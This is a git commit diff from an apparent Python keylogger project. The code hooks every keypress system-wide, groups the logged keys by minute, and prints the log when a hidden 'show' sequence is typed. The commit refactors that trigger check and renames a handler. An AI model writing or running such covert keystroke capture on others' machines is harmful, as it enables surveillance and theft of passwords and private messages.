dda4d9ddf585b140996780922e26d58b6972419e
yosef-770 <yavitan1234@gmail.com>
2025-06-20 16:44:00 +0300

    .

--- chek_if_show.py
+++ chek_if_show.py
@@ -1,8 +1,4 @@
 def check_if_get_show(details_keys):
     last_items = details_keys[-4:]
-    exists = ''.join([list(entry.values())[0] for entry in last_items])
-
-    if 's' in exists and 'h' in exists and 'o' in exists and 'w' in exists:
-        return True
-    else:
-        return False
+    values = [list(entry.values())[0] for entry in last_items]
+    return values == ['s', 'h', 'o', 'w']
--- main.py
+++ main.py
@@ -5,12 +5,12 @@ from text_by_minute import key_by_minute
 from print_keystrokes import print_key_log
 from chek_if_show import check_if_get_show
 
-def handle_key(e):
+def call_on_key(e):
     get_key.on_key(e)
     if check_if_get_show(get_key.details_keys):
         r_key_by_minute = key_by_minute(get_key.details_keys)
         print_key_log(r_key_by_minute)
         get_key.details_keys.clear()
 
-keyboard.on_press(handle_key)
+keyboard.on_press(call_on_key)
 keyboard.wait("ctrl+shift+g")
